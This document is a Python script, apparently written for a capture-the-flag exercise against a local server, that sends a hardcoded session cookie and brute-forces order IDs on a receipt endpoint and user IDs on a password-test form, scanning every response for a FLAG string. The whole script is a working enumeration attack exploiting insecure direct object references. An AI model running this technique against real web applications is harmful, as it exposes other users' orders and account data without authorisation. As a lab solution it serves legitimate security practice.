import requests
import re
import time

# Setup session with the provided cookie
session = requests.Session()
session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfG0g.bPRm0dzn3RoriNF_1uS0DcOde00"
session.cookies.set('session', session_cookie)

base_url = "http://127.0.0.1"
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
}

print("=" * 80)
print("FUZZING ORDER_ID PARAMETER - GET /order/{order_id}/receipt")
print("=" * 80)

# Define test ranges for order_id
order_ranges = [
    (300000, 301000, "Primary range (300000-301000)"),
    (1, 1000, "Low range (1-1000)"),
    (100000, 101000, "Mid range (100000-101000)"),
    (200000, 201000, "High range (200000-201000)")
]

found_orders = []
flag_found = False

for start, end, description in order_ranges:
    print(f"\n[+] Testing {description}")
    print("-" * 80)
    
    range_found = 0
    for order_id in range(start, end + 1):
        url = f"{base_url}/order/{order_id}/receipt"
        
        try:
            response = session.get(url, headers=headers, timeout=10, allow_redirects=False)
            
            # Check for FLAG pattern in any response
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"\n[!] FLAG FOUND in order {order_id}!")
                print(f"[!] Flag: {flag_match.group()}")
                print(f"[!] Full response:\n{response.text}\n")
                flag_found = True
            
            # Log successful responses with content
            if response.status_code == 200 and len(response.text.strip()) > 0:
                print(f"[+] Order ID {order_id}: SUCCESS (length: {len(response.text)} bytes)")
                print(f"    Response preview: {response.text[:200]}...")
                found_orders.append({
                    'id': order_id,
                    'status': response.status_code,
                    'length': len(response.text),
                    'content': response.text
                })
                range_found += 1
            elif response.status_code != 404 and response.status_code != 302:
                # Anomalous response (not 200, 404, or redirect)
                print(f"[?] Order ID {order_id}: UNUSUAL STATUS {response.status_code} (length: {len(response.text)})")
                if len(response.text) > 0:
                    print(f"    Response: {response.text}")
        
        except Exception as e:
            print(f"[-] Error testing order {order_id}: {e}")
    
    print(f"[+] Range complete. Found {range_found} orders with data.")

print("\n" + "=" * 80)
print("SUMMARY - ORDER_ID FUZZING")
print("=" * 80)
print(f"Total orders found: {len(found_orders)}")

if found_orders:
    print("\n[+] All discovered orders:")
    for order in found_orders:
        print(f"  - Order ID: {order['id']} | Length: {order['length']} bytes")

if not flag_found:
    print("\n[-] No FLAG pattern found in order responses")

print("\n" + "=" * 80)
print("FUZZING USER_ID PARAMETER - POST /password/test")
print("=" * 80)

# First, GET the page to see the form structure
print("\n[+] Analyzing /password/test form structure...")
form_url = f"{base_url}/password/test"
try:
    get_response = session.get(form_url, headers=headers, timeout=10)
    print(f"GET Status: {get_response.status_code}")
    print(f"Form page content:\n{get_response.text}\n")
except Exception as e:
    print(f"[-] Error getting form page: {e}")

# Test user_id parameter
print("\n[+] Testing user_id values from 1 to 100...")
print("-" * 80)

interesting_responses = 0

for user_id in range(1, 101):
    # Create form data with user_id
    form_data = {
        'user_id': str(user_id)
        # Other fields might be required, but we'll test with minimal data first
    }
    
    try:
        response = session.post(form_url, data=form_data, headers=headers, timeout=10, allow_redirects=False)
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"\n[!] FLAG FOUND for user_id {user_id}!")
            print(f"[!] Flag: {flag_match.group()}")
            print(f"[!] Full response:\n{response.text}\n")
            flag_found = True
        
        # Log interesting responses (non-404, non-empty, or status changes)
        if response.status_code != 404 or len(response.text.strip()) > 0:
            print(f"[+] user_id {user_id}: Status {response.status_code} | Length: {len(response.text)}")
            if len(response.text) > 0:
                print(f"    Response: {response.text}")
            interesting_responses += 1
        
    except Exception as e:
        print(f"[-] Error testing user_id {user_id}: {e}")

print(f"\n[+] User ID fuzzing complete. Found {interesting_responses} interesting responses.")

print("\n" + "=" * 80)
print("FINAL SUMMARY")
print("=" * 80)

if flag_found:
    print("[✓] FLAG was found during fuzzing - check output above!")
else:
    print("[-] No FLAG pattern found in any responses")

print(f"\n[✓] Order fuzzing: {len(found_orders)} orders discovered")
print(f"[✓] User ID fuzzing: {interesting_responses} interesting responses")
